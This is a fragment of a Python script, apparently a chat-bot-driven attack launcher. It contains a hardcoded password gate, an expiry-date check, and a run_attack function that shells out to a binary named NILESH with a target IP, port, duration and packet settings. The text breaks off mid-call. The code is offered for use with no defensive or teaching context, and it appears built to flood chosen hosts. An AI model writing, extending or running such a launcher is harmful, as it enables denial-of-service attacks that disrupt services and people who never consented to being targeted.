...
# Password Protection
correct_password = "NILESHMODZ"  # Set your password here
password = input("Enter the password to run this script: ")

if password != correct_password:
    print("Incorrect password. Access denied!")
    exit()  # Exit the script if the password is wrong

print("Access granted. Checking expiration date...\n")


from datetime import datetime

# Expiration Date Protection
expiration_date = datetime(2024, 12, 31)  # Set your expiration date here (YYYY, MM, DD)
current_date = datetime.now()

if current_date > expiration_date:
    print("This script has expired. Please contact the administrator.")
    exit()  # Exit the script if the current date is past the expiration date

print("Script is within the valid date range. Continuing execution...\n")
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./NILESH {ip} {port} {duration} 256 1200",
